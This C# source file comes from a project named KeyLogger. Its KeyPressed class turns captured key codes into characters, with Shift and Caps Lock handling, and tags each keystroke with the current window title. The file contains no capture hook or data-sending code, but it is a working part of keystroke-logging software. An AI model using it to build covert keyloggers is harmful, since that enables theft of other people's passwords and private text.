using System.Collections.Generic;

namespace KeyLogger.CallbackMethods
{
    public class KeyPressed
    {
        public KeyCode MyKeyCode { get; set; }
        public bool CapsLockOn { get; set; }
        public bool ShiftKeyDown { get; set; }
        public string CurrentWindowTitle { get; set; }
        //public string KeyboardLayout { get; set; }

        static Dictionary<KeyCode, string> KeyMaps;

        /// <summary>
        /// Static ctor in order to init this class only once in all instance
        /// </summary>
        static KeyPressed()
        {
            KeyMaps = new Dictionary<KeyCode, string>
            {
                { KeyCode.F1, "<F1>" },
                { KeyCode.F2, "<F2>" },
                { KeyCode.F3, "<F3>" },
                { KeyCode.F4, "<F4>" },
                { KeyCode.F5, "<F5>" },
                { KeyCode.F6, "<F6>" },
                { KeyCode.F7, "<F7>" },
                { KeyCode.F8, "<F8>" },
                { KeyCode.F9, "<F9>" },
                { KeyCode.F10, "<F10>" },
                { KeyCode.F11, "<F11>" },
                { KeyCode.F12, "<F12>" },
                { KeyCode.Snapshot, "<print screen>" },
                { KeyCode.Scroll, "<scroll>" },
                { KeyCode.Pause, "<pause>" },
                { KeyCode.Insert, "<insert>" },
                { KeyCode.Home, "<home>" },
                { KeyCode.Delete, "<delete>" },
                { KeyCode.End, "<end>" },
                { KeyCode.Prior, "<page up>" },
                { KeyCode.Next, "<page down>" },
                { KeyCode.Escape, "<esc>" },
                { KeyCode.NumLock, "<numlock>" },
                { KeyCode.Tab, "<tab>" },
                { KeyCode.Back, "<backspace>" },
                { KeyCode.Return, "<enter>" },
                { KeyCode.Space, " " },
                { KeyCode.Left, "<left>" },
                { KeyCode.Up, "<up>" },
                { KeyCode.Right, "<right>" },
                { KeyCode.Down, "<down>" },

                { KeyCode.LMenu, "<alt>" },
                { KeyCode.RMenu, "<alt>" },
                { KeyCode.LWin, "<win>" },
                { KeyCode.RWin, "<win>" },
                { KeyCode.Capital, "<capsLock>" },
                { KeyCode.LControlKey, "<ctrl>" },
                { KeyCode.RControlKey, "<ctrl>" },
                { KeyCode.LShiftKey, "<shift>" },
                { KeyCode.RShiftKey, "<shift>" },

                { KeyCode.VolumeDown, "<volumeDown>" },
                { KeyCode.VolumeUp, "<volumeUp>" },
                { KeyCode.VolumeMute, "<volumeMute>" },

                { KeyCode.Multiply, "*" },
                { KeyCode.Add, "+" },
                { KeyCode.Separator, "|" },
                { KeyCode.Subtract, "-" },
                { KeyCode.Divide, "/" },
                { KeyCode.Oemplus, "=" },
                { KeyCode.Oemcomma, "," },
                { KeyCode.OemMinus, "-" },
                { KeyCode.OemPeriod, "." },
                { KeyCode.NumPadDot, "." },

                { KeyCode.Decimal, "." },
                { KeyCode.Oem1, "" },
                { KeyCode.Oem2, "/" },
                { KeyCode.Oem3, "`" },
                { KeyCode.Oem4, "[" },
                { KeyCode.Oem5, "\\" },
                { KeyCode.Oem6, "]" },
                { KeyCode.Oem7, "'" },

                { KeyCode.NumPad0, "0" },
                { KeyCode.NumPad1, "1" },
                { KeyCode.NumPad2, "2" },
                { KeyCode.NumPad3, "3" },
                { KeyCode.NumPad4, "4" },
                { KeyCode.NumPad5, "5" },
                { KeyCode.NumPad6, "6" },
                { KeyCode.NumPad7, "7" },
                { KeyCode.NumPad8, "8" },
                { KeyCode.NumPad9, "9" },
                { KeyCode.Q, "q" },
                { KeyCode.W, "w" },
                { KeyCode.E, "e" },
                { KeyCode.R, "r" },
                { KeyCode.T, "t" },
                { KeyCode.Y, "y" },
                { KeyCode.U, "u" },
                { KeyCode.I, "i" },
                { KeyCode.O, "o" },
                { KeyCode.P, "p" },
                { KeyCode.A, "a" },
                { KeyCode.S, "s" },
                { KeyCode.D, "d" },
                { KeyCode.F, "f" },
                { KeyCode.G, "g" },
                { KeyCode.H, "h" },
                { KeyCode.J, "j" },
                { KeyCode.K, "k" },
                { KeyCode.L, "l" },
                { KeyCode.Z, "z" },
                { KeyCode.X, "x" },
                { KeyCode.C, "c" },
                { KeyCode.V, "v" },
                { KeyCode.B, "b" },
                { KeyCode.N, "n" },
                { KeyCode.M, "m" },
                { KeyCode.D0, "0" },
                { KeyCode.D1, "1" },
                { KeyCode.D2, "2" },
                { KeyCode.D3, "3" },
                { KeyCode.D4, "4" },
                { KeyCode.D5, "5" },
                { KeyCode.D6, "6" },
                { KeyCode.D7, "7" },
                { KeyCode.D8, "8" },
                { KeyCode.D9, "9" }
            };
        }

        internal KeyPressed(KeyCode keyCode, bool shiftKeyDown, bool capsLockOn, string currentWindowTitle)
        {
            MyKeyCode = keyCode;
            ShiftKeyDown = shiftKeyDown;
            CapsLockOn = capsLockOn;
            CurrentWindowTitle = currentWindowTitle;
            //this.KeyboardLayout = keyboardLayout;
        }

        public override string ToString()
        {
            var character = KeyCodeToString();

            if (IsAlpha())
            {
                //If both (shift and caps) are active then the string remains lowercase
                if (ShiftKeyDown == CapsLockOn)
                    return character;
                else
                    return character.ToUpper();
            }
            else if (ShiftKeyDown)
            {
                return ShiftCharacter(character);
            }

            return character;
        }

        /// <summary>
        /// Returns True if keyCode is alphabetic, otherwise False
        /// </summary>
        private bool IsAlpha()
        {
            return (int)MyKeyCode > 64 && (int)MyKeyCode < 91;
        }

        /// <summary>
        /// Returns keyCode as string
        /// </summary>
        /// <returns></returns>
        private string KeyCodeToString()
        {
            if (KeyMaps.ContainsKey(MyKeyCode))
                return KeyMaps[MyKeyCode];
            return string.Empty;
        }

        /// <summary>
        /// Returns shifted characters when SHIFT key is pressed
        /// </summary>
        private string ShiftCharacter(string character)
        {
            if (MyKeyCode == KeyCode.D1) return "!";
            if (MyKeyCode == KeyCode.D2) return "@";
            if (MyKeyCode == KeyCode.D3) return "#";
            if (MyKeyCode == KeyCode.D4) return "$";
            if (MyKeyCode == KeyCode.D5) return "%";
            if (MyKeyCode == KeyCode.D6) return "^";
            if (MyKeyCode == KeyCode.D7) return "&";
            if (MyKeyCode == KeyCode.D8) return "*";
            if (MyKeyCode == KeyCode.D9) return "(";
            if (MyKeyCode == KeyCode.D0) return ")";
            if (MyKeyCode == KeyCode.Oemcomma) return "<";
            if (MyKeyCode == KeyCode.OemMinus) return "_";
            if (MyKeyCode == KeyCode.OemPeriod) return ">";
            if (MyKeyCode == KeyCode.Oemplus) return "+";
            if (MyKeyCode == KeyCode.LatinKeyboardBar) return "?";
            //EN-US
            if (MyKeyCode == KeyCode.Oem1) return ":";
            if (MyKeyCode == KeyCode.Oem2) return "?";
            if (MyKeyCode == KeyCode.Oem3) return "~";
            if (MyKeyCode == KeyCode.Oem4) return "{";
            if (MyKeyCode == KeyCode.Oem5) return "|";
            if (MyKeyCode == KeyCode.Oem6) return "}";
            if (MyKeyCode == KeyCode.Oem7) return "\"";

            //Character not "shiftable"
            return character;
        }
    }
}
